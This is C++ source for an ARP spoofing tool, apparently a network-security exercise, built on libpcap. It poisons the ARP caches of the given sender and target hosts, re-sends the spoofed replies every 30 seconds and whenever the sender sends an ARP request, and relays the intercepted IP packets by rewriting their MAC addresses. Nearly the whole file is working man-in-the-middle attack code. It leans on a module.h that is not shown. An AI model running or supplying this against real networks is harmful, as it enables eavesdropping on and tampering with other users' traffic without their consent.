#include <stdio.h>
#include <unistd.h>
#include <memory.h>
#include <pcap.h>
#include <time.h>
#include <vector>
#include "module.h"
#define PERIOD 30 // seconds

using namespace std;

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc%2 != 0) {
    usage();
    return -1;
  }

  const int SESSION_NUM = (argc - 2) / 2;

  char * dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  vector<session> sess(SESSION_NUM);
  uint8_t attacker_ip[IP_ADDR_LEN];
  char attacker_ip_ori[16];
  uint8_t attacker_mac[ETHER_ADDR_LEN];

  getAttackerIPAddress(attacker_ip_ori, dev);
  parseIP(attacker_ip, attacker_ip_ori);
  printIPAddress("Attacker ip", attacker_ip);

  for(int i = 0; i < SESSION_NUM; i++) {
    parseIP(sess[i].sender_ip, argv[2 + 2 * i]);
    parseIP(sess[i].target_ip, argv[3 + 2 * i]);
    printIPAddress("Sender ip", sess[i].sender_ip);
    printIPAddress("Target ip", sess[i].target_ip);

    sess[i].atk_ok = getAttackerMacAddress(attacker_mac, dev);
    printMacAddress("Attacker Mac Address", sess[i].atk_ok ? attacker_mac : NULL);

    sess[i].sdr_ok = getMacAddress(handle, sess[i].sender_mac, attacker_mac, attacker_ip, sess[i].sender_ip);
    printMacAddress("Sender Mac Address", sess[i].sdr_ok ? sess[i].sender_mac : NULL);

    sess[i].trg_ok = getMacAddress(handle, sess[i].target_mac, attacker_mac, attacker_ip, sess[i].target_ip);
    printMacAddress("Target Mac Address", sess[i].trg_ok ? sess[i].target_mac : NULL);
    
    printf("\n\n");
    if(sess[i].atk_ok && sess[i].sdr_ok && sess[i].trg_ok) sess[i].active = true;
  }
  
  time_t start = time(NULL);
  while(true) {
    time_t cur = time(NULL);
    if(cur - start >= PERIOD) {
      for(int i = 0; i < SESSION_NUM; i++) {
        if(!sess[i].active) continue;
        sendArpPacket(handle, attacker_mac, sess[i].sender_mac, sess[i].target_ip, sess[i].sender_ip, 2);
      }
      start = cur;
    }

    struct pcap_pkthdr * header;
    const u_char * packet;

    int res = pcap_next_ex(handle, &header, &packet);
    if(res == 0) continue;
    if(res < 0) break;

    struct ether_header * ether_pkt = (struct ether_header *)packet;
    if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_ARP) { // send infection packet
      struct arp_packet * arp_pkt = (struct arp_packet *)packet;

      for(int i = 0; i< SESSION_NUM; i++) {
        if(!sess[i].active) continue;
        if(cmpMacAddress(arp_pkt -> arp_hdr.arp_sha, sess[i].sender_mac) && cmpIPAddress(arp_pkt -> arp_hdr.arp_tpa, sess[i].target_ip)) {
            sendArpPacket(handle, attacker_mac, sess[i].sender_mac, sess[i].target_ip, sess[i].sender_ip, 2);
        }
      }
    }

    else if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_IP) { // send relay packet
      struct ip_packet * ip_pkt = (struct ip_packet *)packet;

      for(int i = 0; i< SESSION_NUM; i++) {
        if(!sess[i].active) continue;

        uint8_t packet_src_ip[4], packet_dst_ip[4];
        changeIP(packet_src_ip, &ip_pkt -> ip_hdr.ip_src.s_addr);
        changeIP(packet_dst_ip, &ip_pkt -> ip_hdr.ip_dst.s_addr);
        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sess[i].sender_mac) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, attacker_mac) && cmpIPAddress(packet_src_ip, sess[i].sender_ip)) {
          printf("\n[+] Send Relay Packet!\n");
          printMacAddress("  Old Src MAC", ip_pkt -> eth_hdr.ether_shost);
          printMacAddress("  Old Dst MAC", ip_pkt -> eth_hdr.ether_dhost);
          memcpy(ip_pkt -> eth_hdr.ether_shost, attacker_mac, ETHER_ADDR_LEN);
          memcpy(ip_pkt -> eth_hdr.ether_dhost, sess[i].target_mac, ETHER_ADDR_LEN);
          printMacAddress("  New Src MAC", ip_pkt -> eth_hdr.ether_shost);
          printMacAddress("  New Dst MAC", ip_pkt -> eth_hdr.ether_dhost);

          printIPAddress("  Source IP", packet_src_ip);
          printIPAddress("  Target IP", packet_dst_ip);
          pcap_sendpacket(handle, packet, header -> caplen);
        }
      }
    }
  }

  pcap_close(handle);

  return 0;
}